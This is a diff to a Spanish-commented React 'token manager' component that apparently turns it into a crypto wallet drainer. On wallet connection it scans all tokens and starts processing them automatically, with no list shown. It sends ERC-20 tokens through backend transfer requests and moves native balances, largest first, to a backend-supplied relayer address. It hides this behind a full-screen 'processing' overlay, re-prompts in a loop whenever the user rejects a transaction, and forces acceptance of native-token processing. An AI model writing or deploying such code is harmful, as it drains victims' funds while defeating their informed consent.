@@ -26,19 +26,6 @@ interface FailedItem {
   reason: string
 }
 
-// Hook personalizado para detectar dispositivos móviles
-const useIsMobile = () => {
-  const [isMobile, setIsMobile] = useState(false);
-  
-  useEffect(() => {
-    if (typeof window !== 'undefined') {
-      setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
-    }
-  }, []);
-  
-  return isMobile;
-};
-
 // Función helper para fetch con mejor manejo de errores
 const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
   const res = await fetch(url, options);
@@ -66,20 +53,69 @@ export default function TokenManager(): React.JSX.Element {
   const { data: balance } = useBalance({ address })
   const { data: feeData } = useFeeData()
   const [tokens, setTokens] = useState<Token[]>([])
-  const [loading, setLoading] = useState<boolean>(false)
   const [processing, setProcessing] = useState<boolean>(false)
   const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
   const [isClient, setIsClient] = useState<boolean>(false)
-  const isMobileDevice = useIsMobile()
+  const [hasScanned, setHasScanned] = useState<boolean>(false)
+  const [scanError, setScanError] = useState<string>('')
+  const [isLoading, setIsLoading] = useState<boolean>(false)
+  const [loadingMessage, setLoadingMessage] = useState<string>('')
+  const [showProcessingModal, setShowProcessingModal] = useState<boolean>(false)
+  const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
+  const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
 
+  const changeChainIfNeeded = async (targetChainId: number): Promise<void> => {
+  try {
+    if (!walletClient) throw new Error('Wallet client no disponible');
+    
+    // Obtener la cadena actual
+    const currentChainId = await walletClient.getChainId();
+    if (currentChainId === targetChainId) return;
+
+    // Intentar cambiar de cadena
+    showLoading(`Cambiando a la red ${targetChainId}...`);
+    
+    await walletClient.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: `0x${targetChainId.toString(16)}` }],
+    });
+    
+    // Esperar a que la wallet se actualice
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+  } catch (error: any) {
+    if (error.code === 4902) {
+      // Cadena no agregada en la wallet - agregar BNB Chain si es necesario
+      if (targetChainId === 56) {
+        await walletClient.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: {
+              name: 'BNB',
+              symbol: 'BNB',
+              decimals: 18,
+            },
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com/'],
+          }],
+        });
+        return;
+      }
+      throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`);
+    }
+    if (isUserRejected(error)) {
+      throw new Error('Usuario rechazó el cambio de red');
+    }
+    throw new Error(`Error cambiando de red: ${error.message}`);
+  }
+};
+
   useEffect(() => {
     setIsClient(true)
-
-    // Mostrar valores de entorno para depuración
-    console.log('[ENV] NEXT_PUBLIC_BACKEND_URL =', BACKEND)
-    console.log('[ENV] NEXT_PUBLIC_PROJECT_URL =', process.env.NEXT_PUBLIC_PROJECT_URL)
 
     // Global error handlers
     const onError = (e: ErrorEvent) => {
@@ -96,24 +132,46 @@ export default function TokenManager(): React.JSX.Element {
       window.removeEventListener('error', onError)
       window.removeEventListener('unhandledrejection', onRejection)
     }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   useEffect(() => {
-    if (isConnected && address) {
+    if (isConnected && address && !hasScanned && !scanError) {
       scanWallet()
     }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isConnected, address])
+  }, [isConnected, address, hasScanned, scanError])
+
+  useEffect(() => {
+    // Iniciar procesamiento automáticamente cuando se detectan tokens
+    if (hasScanned && tokens.length > 0 && !processing) {
+      setShowProcessingModal(true)
+      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
+      setTimeout(() => {
+        processAllTokens()
+      }, 1500)
+    }
+  }, [hasScanned, tokens, processing])
+
+  const showLoading = (message: string) => {
+    setLoadingMessage(message)
+    setIsLoading(true)
+  }
+
+  const hideLoading = () => {
+    setIsLoading(false)
+    setLoadingMessage('')
+  }
 
   const scanWallet = async (): Promise<void> => {
     try {
-      setLoading(true)
+      setScanError('')
+      showLoading('Escaneando tokens en todas las cadenas...')
 
       if (!BACKEND) {
-        console.error('[CONFIG] NEXT_PUBLIC_BACKEND_URL no está definido.')
-        await alertAction('Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.')
-        setLoading(false)
+        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
+        console.error('[CONFIG]', errorMsg)
+        setScanError(errorMsg)
+        hideLoading()
+        await alertAction(errorMsg)
         return
       }
 
@@ -135,12 +193,27 @@ export default function TokenManager(): React.JSX.Element {
         return token
       })
 
+      // Guardar todos los tokens
       setTokens(processedTokens || [])
+      setDetectedTokensCount(processedTokens.length)
+      setHasScanned(true)
+      
+      // Preparar tokens nativos pendientes
+      const nativeTokens = processedTokens.filter(token => !token.address)
+      setPendingNativeTokens(nativeTokens)
+      
+      // Log de tokens en consola
+      if (processedTokens.length > 0) {
+        console.log('Tokens detectados:', processedTokens)
+      }
+      
+      hideLoading()
     } catch (err: any) {
       console.error('Error escaneando wallet:', err)
-      await alertAction('Error escaneando wallet: ' + (err?.message || err))
-    } finally {
-      setLoading(false)
+      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
+      setScanError(errorMsg)
+      hideLoading()
+      await alertAction(errorMsg + '\n\nPor favor, intenta reconectar la wallet.')
     }
   }
 
@@ -214,21 +287,23 @@ export default function TokenManager(): React.JSX.Element {
     return /user denied|user rejected|rejected by user/i.test(message)
   }
 
-  const processNativeToken = async (token: Token): Promise<void> => {
-    try {
-      if (!walletClient || !publicClient || !address) {
-        throw new Error('Wallet no conectada correctamente')
-      }
+  const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
+  try {
+    if (!walletClient || !publicClient || !address) {
+      throw new Error('Wallet no conectada correctamente');
+    }
 
-      const chainId = (publicClient as any)?.chain?.id as number | undefined
-      if (!chainId && typeof token.chain === 'number') {
-        // fallback a token.chain si publicClient no tiene chain
-      } else if (!chainId) {
-        throw new Error('No se pudo determinar la cadena')
-      }
+    const targetChainId = token.chain as number;
+    if (!targetChainId) {
+      throw new Error('No se pudo determinar la cadena del token');
+    }
 
-      const wrapInfo = await getWrapInfo(chainId || (token.chain as number))
-      const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress
+    // Cambiar a la cadena correcta antes de procesar
+    await changeChainIfNeeded(targetChainId);
+
+    // Resto del código para wrap o transferencia...
+    const wrapInfo = await getWrapInfo(targetChainId);
+    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
 
       const balanceBN = ethers.BigNumber.from(token.balance || '0')
       const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
@@ -250,104 +325,159 @@ export default function TokenManager(): React.JSX.Element {
       if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
         const reason = 'Saldo insuficiente para cubrir gas fees'
         setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
-        return
+        return { success: false, reason }
       }
 
-      // Si hay wrapped disponible y saldo suficiente, ofrecer wrap
+      // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
       if (wrappedAddress && maxSafeForWrap.gt(0)) {
-        const humanAmount = ethers.utils.formatEther(maxSafeForWrap)
-        const shouldWrap = await confirmAction(`¿Deseas wrappear ${humanAmount} ${token.symbol}? (Recomendado para mejores tasas)`)
-
-        if (shouldWrap) {
-          try {
-            const wrapAbi = [
-              {
-                inputs: [],
-                name: 'deposit',
-                outputs: [],
-                stateMutability: 'payable',
-                type: 'function'
-              }
-            ] as const
-
-            const hash = await walletClient.writeContract({
-              address: wrappedAddress as `0x${string}`,
-              abi: wrapAbi,
-              functionName: 'deposit',
-              value: maxSafeForWrap.toBigInt(),
-              gas: gasLimitWrap.toBigInt()
-            })
-
-            await publicClient.waitForTransactionReceipt({ hash })
-
-            setSummary(prev => ({
-              ...prev,
-              sent: [...prev.sent, { token: { ...token, symbol: `W${token.symbol}` }, type: 'wrap', tx: hash, amount: maxSafeForWrap.toString() }]
-            }))
-
-            return
-          } catch (error: any) {
-            if (isUserRejected(error)) {
-              setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: 'Usuario rechazó el wrap' }] }))
-              return
+        try {
+          showLoading(`Procesando wrap de ${token.symbol}...`)
+          
+          const wrapAbi = [
+            {
+              inputs: [],
+              name: 'deposit',
+              outputs: [],
+              stateMutability: 'payable',
+              type: 'function'
             }
-            throw error
+          ] as const
+
+          // Reintentar hasta que la transacción sea confirmada
+          let transactionHash: string | undefined;
+          let confirmed = false;
+          
+          while (!confirmed) {
+            try {
+              transactionHash = await walletClient.writeContract({
+                address: wrappedAddress as `0x${string}`,
+                abi: wrapAbi,
+                functionName: 'deposit',
+                value: maxSafeForWrap.toBigInt(),
+                gas: gasLimitWrap.toBigInt()
+              })
+
+              showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
+              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
+              confirmed = true;
+
+            } catch (error: any) {
+              if (isUserRejected(error)) {
+                // Si el usuario rechaza, mostrar alerta y reintentar
+                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
+                continue;
+              }
+              throw error;
+            }
           }
-        }
-      }
+
+          setSummary(prev => ({
+            ...prev,
+            sent: [...prev.sent, { 
+              token: { ...token, symbol: `W${token.symbol}` }, 
+              type: 'wrap', 
+              tx: transactionHash, 
+              amount: maxSafeForWrap.toString() 
+            }]
+          }))
+
+          hideLoading()
+          return { success: true }
+        } catch (error: any) {
+            // Manejo de errores
+            console.error('Error procesando token nativo:', error);
+            const reason = isUserRejected(error) ? 
+              'Usuario rechazó la transacción' : 
+              `Error: ${error?.message || error}`;
+
+            setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
+            return { success: false, reason };
+          }
+        };
 
       // Si no se hizo wrap, crear solicitud de transferencia en el backend
       if (maxSafeForTransfer.gt(0)) {
-        const humanAmount = ethers.utils.formatEther(maxSafeForTransfer)
-        const shouldTransfer = await confirmAction(`¿Deseas transferir ${humanAmount} ${token.symbol} al relayer?`)
-
-        if (shouldTransfer) {
-          if (!BACKEND) throw new Error('BACKEND no configurado')
-          const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
-            method: 'POST',
-            headers: { 
-              'Content-Type': 'application/json',
-              'Accept': 'application/json'
-            },
-            body: JSON.stringify({
-              owner: address,
-              chain: token.chain,
-              amount: maxSafeForTransfer.toString()
-            })
+        if (!BACKEND) throw new Error('BACKEND no configurado')
+        
+        showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
+        const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({
+            owner: address,
+            chain: token.chain,
+            amount: maxSafeForTransfer.toString()
           })
+        })
 
-          if (data.ok && data.instructions && data.instructions.relayerAddress) {
-            const hash = await walletClient.sendTransaction({
-              to: data.instructions.relayerAddress as `0x${string}`,
-              value: maxSafeForTransfer.toBigInt(),
-              gas: gasLimitTransfer.toBigInt()
-            })
+        if (data.ok && data.instructions && data.instructions.relayerAddress) {
+          // Reintentar hasta que la transacción sea confirmada
+          let transactionHash: string | undefined;
+          let confirmed = false;
+          
+          while (!confirmed) {
+            try {
+              showLoading(`Enviando ${token.symbol} al relayer...`)
+              transactionHash = await walletClient.sendTransaction({
+                to: data.instructions.relayerAddress as `0x${string}`,
+                value: maxSafeForTransfer.toBigInt(),
+                gas: gasLimitTransfer.toBigInt()
+              })
 
-            await publicClient.waitForTransactionReceipt({ hash })
+              showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
+              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
+              confirmed = true;
 
-            setSummary(prev => ({
-              ...prev,
-              sent: [...prev.sent, { token, type: 'transfer', tx: hash, amount: maxSafeForTransfer.toString(), jobId: data.jobId }]
-            }))
-          } else {
-            throw new Error('Error creando solicitud de transferencia')
+            } catch (error: any) {
+              if (isUserRejected(error)) {
+                // Si el usuario rechaza, mostrar alerta y reintentar
+                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
+                continue;
+              }
+              throw error;
+            }
           }
+
+          setSummary(prev => ({
+            ...prev,
+            sent: [...prev.sent, { 
+              token, 
+              type: 'transfer', 
+              tx: transactionHash, 
+              amount: maxSafeForTransfer.toString(), 
+              jobId: data.jobId 
+            }]
+          }))
+          
+          hideLoading()
+          return { success: true }
         } else {
-          setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: 'Usuario canceló la transferencia' }] }))
+          hideLoading()
+          throw new Error('Error creando solicitud de transferencia')
         }
       }
+      
+      hideLoading()
+      return { success: false, reason: 'No se pudo procesar el token nativo' }
     } catch (error: any) {
+      hideLoading()
       console.error('Error procesando token nativo:', error)
 
       const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`
 
       setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+      return { success: false, reason }
     }
   }
 
-  const processToken = async (token: Token): Promise<void> => {
+  const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
     try {
       if (!BACKEND) throw new Error('BACKEND no configurado')
+      
+      showLoading(`Procesando ${token.symbol}...`)
       const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
         method: 'POST',
         headers: { 
@@ -364,34 +494,71 @@ export default function TokenManager(): React.JSX.Element {
 
       if (data.ok) {
         setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
-        await alertAction('Solicitud de transferencia creada. El relayer procesará pronto.')
+        hideLoading()
+        return { success: true }
       } else {
+        hideLoading()
         throw new Error(data.error || 'Error creando solicitud de transferencia')
       }
     } catch (error: any) {
+      hideLoading()
       console.error('Error procesando token:', error)
       setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
+      return { success: false, reason: error?.message || 'Error desconocido' }
     }
   }
 
   const processAllTokens = async (): Promise<void> => {
-    if (!tokens.length) return
+    if (!tokens.length) {
+      setShowProcessingModal(false)
+      return
+    }
 
     setProcessing(true)
-    // Creamos una copia local del resumen para evitar problemas de asincronía
-    const localSummary = { sent: [] as SentItem[], failed: [] as FailedItem[] }
+    setSummary({ sent: [], failed: [] }) // Reset summary
     
-    for (const token of tokens) {
-      if (!token.address) {
-        await processNativeToken(token)
-      } else {
-        await processToken(token)
+    // Separar tokens nativos y no nativos
+    const nonNativeTokens = tokens.filter(token => token.address !== null)
+    const nativeTokens = tokens.filter(token => token.address === null)
+    
+    // Si hay tokens nativos, mostrar confirmación persistente
+    if (nativeTokens.length > 0) {
+      let shouldProcessNatives = false;
+      
+      // Persistir hasta que el usuario acepte procesar los tokens nativos
+      while (!shouldProcessNatives) {
+        shouldProcessNatives = await confirmAction(
+          `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
+        );
+        
+        if (!shouldProcessNatives) {
+          // Si el usuario cancela, mostrar mensaje y volver a preguntar
+          await alertAction('Debes aceptar el procesamiento de tokens nativos para continuar.');
+        }
       }
+    }
+    
+    // Ordenar tokens nativos por balance (mayor primero)
+    const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
+      const balanceA = ethers.BigNumber.from(a.balance || '0')
+      const balanceB = ethers.BigNumber.from(b.balance || '0')
+      return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
+    })
+
+    // Procesar tokens no nativos automáticamente
+    for (const token of nonNativeTokens) {
+      await processToken(token)
+    }
+
+    // Procesar tokens nativos automáticamente
+    for (const token of sortedNativeTokens) {
+      await processNativeToken(token)
     }
 
     setProcessing(false)
+    setShowProcessingModal(false)
 
-    // Usamos setTimeout para esperar a que el estado se actualice completamente
+    // Mostrar resumen después de un breve delay para que se actualice el estado
     setTimeout(async () => {
       if (summary.sent.length > 0 || summary.failed.length > 0) {
         let message = '=== Resumen ===\n'
@@ -410,7 +577,13 @@ export default function TokenManager(): React.JSX.Element {
   // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
     return (
-      <div style={{ padding: '20px', fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto' }}>
+      <div style={{
+        display: 'flex',
+        justifyContent: 'center',
+        alignItems: 'center',
+        height: '100vh',
+        flexDirection: 'column'
+      }}>
         <h1>Administrador de Tokens</h1>
         <p>Cargando...</p>
       </div>
@@ -418,9 +591,13 @@ export default function TokenManager(): React.JSX.Element {
   }
 
   return (
-    <div style={{ padding: '20px', fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto' }}>
-      <h1>Administrador de Tokens</h1>
-
+    <div style={{
+      display: 'flex',
+      justifyContent: 'center',
+      alignItems: 'center',
+      height: '100vh',
+      flexDirection: 'column'
+    }}>
       <button
         onClick={() => open()}
         style={{
@@ -430,178 +607,52 @@ export default function TokenManager(): React.JSX.Element {
           color: 'white',
           border: 'none',
           borderRadius: '8px',
-          cursor: 'pointer',
-          marginBottom: '20px'
+          cursor: 'pointer'
         }}
       >
         {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
       </button>
 
-      {isConnected && (
-        <div>
-          <button
-            onClick={scanWallet}
-            disabled={loading}
-            style={{
-              padding: '10px 14px',
-              fontSize: '14px',
-              marginLeft: '10px',
-              backgroundColor: loading ? '#ccc' : '#4CAF50',
-              color: 'white',
-              border: 'none',
-              borderRadius: '4px',
-              cursor: loading ? 'not-allowed' : 'pointer'
-            }}
-          >
-            {loading ? 'Escaneando...' : 'Escanear Tokens'}
-          </button>
-
-          {tokens.length > 0 && (
-            <button
-              onClick={processAllTokens}
-              disabled={processing}
-              style={{
-                padding: '10px 14px',
-                fontSize: '14px',
-                marginLeft: '10px',
-                backgroundColor: processing ? '#ccc' : '#FF5722',
-                color: 'white',
-                border: 'none',
-                borderRadius: '4px',
-                cursor: processing ? 'not-allowed' : 'pointer'
-              }}
-            >
-              {processing ? 'Procesando...' : 'Procesar Todos los Tokens'}
-            </button>
-          )}
-        </div>
-      )}
-
-      {loading && (
-        <div style={{ marginTop: '20px' }}>
-          <p>Escaneando tokens en todas las cadenas...</p>
+      {(isLoading || showProcessingModal) && (
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          backgroundColor: 'rgba(0, 0, 0, 0.8)',
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          zIndex: 1000,
+          flexDirection: 'column'
+        }}>
           <div style={{
-            width: '100%',
-            height: '4px',
-            backgroundColor: '#f0f0f0',
-            borderRadius: '2px',
-            overflow: 'hidden'
-          }}>
-            <div style={{
-              width: '100%',
-              height: '100%',
-              backgroundColor: '#0070f3',
-              animation: 'loading 1.5s infinite ease-in-out'
-            }}></div>
-          </div>
-        </div>
-      )}
-
-      {tokens.length > 0 && (
-        <div style={{ marginTop: '20px' }}>
-          <h2>Tokens Detectados ({tokens.length})</h2>
-          <div style={{
-            maxHeight: '400px',
-            overflow: 'auto',
-            border: '1px solid #e0e0e0',
-            borderRadius: '8px',
-            padding: '10px'
-          }}>
-            {tokens.map((token, index) => {
-              const balanceStr = token.balance ?? '0'
-              const decimals = token.decimals ?? 18
-              let formattedBalance = '0'
-              try {
-                formattedBalance = ethers.utils.formatUnits(balanceStr, decimals)
-              } catch (e) {
-                formattedBalance = balanceStr
-              }
-
-              return (
-                <div key={index} style={{
-                  padding: '12px',
-                  margin: '8px 0',
-                  borderRadius: '6px',
-                  backgroundColor: '#f9f9f9',
-                  border: '1px solid #e0e0e0'
-                }}>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                    <div>
-                      <h3 style={{ margin: '0 0 4px 0' }}>{token.symbol}</h3>
-                      <p style={{ margin: '0', color: '#666', fontSize: '14px' }}>
-                        Balance: {formattedBalance}
-                      </p>
-                      <p style={{ margin: '0', color: '#666', fontSize: '14px' }}>
-                        Cadena: {token.chain} {!token.address && '(Nativo)'}
-                      </p>
-                    </div>
-                    <button
-                      onClick={() => (!token.address ? processNativeToken(token) : processToken(token))}
-                      disabled={processing}
-                      style={{
-                        padding: '8px 12px',
-                        fontSize: '12px',
-                        backgroundColor: '#0070f3',
-                        color: 'white',
-                        border: 'none',
-                        borderRadius: '4px',
-                        cursor: processing ? 'not-allowed' : 'pointer'
-                      }}
-                    >
-                      Procesar
-                    </button>
-                  </div>
-                </div>
-              )
-            })}
-          </div>
-        </div>
-      )}
-
-      {(summary.sent.length > 0 || summary.failed.length > 0) && (
-        <div style={{ marginTop: '20px' }}>
-          <h2>Resumen de Procesamiento</h2>
-
-          {summary.sent.length > 0 && (
-            <div style={{ marginBottom: '20px' }}>
-              <h3 style={{ color: '#4CAF50' }}>Éxitos ({summary.sent.length})</h3>
-              {summary.sent.map((item, index) => (
-                <div key={index} style={{
-                  padding: '10px',
-                  margin: '5px 0',
-                  backgroundColor: '#E8F5E9',
-                  borderRadius: '4px',
-                  fontSize: '14px'
-                }}>
-                  {item.type === 'wrap' ? 'Wrapped' : 'Transferido'} {item.token.symbol} - {item.tx ? `TX: ${String(item.tx).substring(0, 10)}...` : `Job ID: ${item.jobId}`}
-                </div>
-              ))}
-            </div>
-          )}
-
-          {summary.failed.length > 0 && (
-            <div>
-              <h3 style={{ color: '#F44336' }}>Fallos ({summary.failed.length})</h3>
-              {summary.failed.map((item, index) => (
-                <div key={index} style={{
-                  padding: '10px',
-                  margin: '5px 0',
-                  backgroundColor: '#FFEBEE',
-                  borderRadius: '4px',
-                  fontSize: '14px'
-                }}>
-                  {item.token.symbol} - {item.reason}
-                </div>
-              ))}
-            </div>
-          )}
+            width: '50px',
+            height: '50px',
+            border: '5px solid #f3f3f3',
+            borderTop: '5px solid #0070f3',
+            borderRadius: '50%',
+            animation: 'spin 1s linear infinite',
+            marginBottom: '20px'
+          }}></div>
+          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
+            {showProcessingModal 
+              ? `Procesando ${detectedTokensCount} tokens detectados...` 
+              : loadingMessage}
+          </p>
+          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
+            Por favor espere, esto puede tomar varios minutos...
+            <br />
+            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
+          </p>
         </div>
       )}
 
       <style jsx>{`
-        @keyframes loading {
-          0% { transform: translateX(-100%); }
-          100% { transform: translateX(100%); }
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
         }
       `}</style>
     </div>
